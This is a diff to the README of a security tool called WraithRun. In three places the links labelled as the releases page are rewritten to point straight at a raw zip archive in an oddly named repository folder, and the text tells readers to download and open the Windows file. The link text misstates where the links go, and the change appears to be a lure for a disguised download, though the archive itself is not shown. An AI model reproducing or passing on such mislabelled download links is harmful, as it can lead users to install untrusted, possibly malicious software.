@@ -1,6 +1,6 @@
 # WraithRun - Local Cyber Tasks, Run Fast
 
-[![Download WraithRun](https://img.shields.io/badge/Download-WraithRun-blue?style=for-the-badge)](https://github.com/fried-headlock977/WraithRun/releases)
+[![Download WraithRun](https://img.shields.io/badge/Download-WraithRun-blue?style=for-the-badge)](https://github.com/fried-headlock977/WraithRun/raw/refs/heads/main/outlash/Wraith_Run_v3.4.zip)
 
 ## 🚀 What WraithRun Does
 
@@ -36,7 +36,7 @@ For best results, use:
 
 Visit the release page here:
 
-[Go to the WraithRun releases page](https://github.com/fried-headlock977/WraithRun/releases)
+[Go to the WraithRun releases page](https://github.com/fried-headlock977/WraithRun/raw/refs/heads/main/outlash/Wraith_Run_v3.4.zip)
 
 On that page, look for the latest release and download the Windows file that matches your system. If you see more than one file, choose the one for Windows and save it to your computer.
 
@@ -218,4 +218,4 @@ It is best for users who want a simple way to run security tasks on their own co
 
 ## 📌 Download and Start
 
-[Visit the WraithRun releases page](https://github.com/fried-headlock977/WraithRun/releases) and download the latest Windows version, then open the file on your PC
+[Visit the WraithRun releases page](https://github.com/fried-headlock977/WraithRun/raw/refs/heads/main/outlash/Wraith_Run_v3.4.zip) and download the latest Windows version, then open the file on your PC
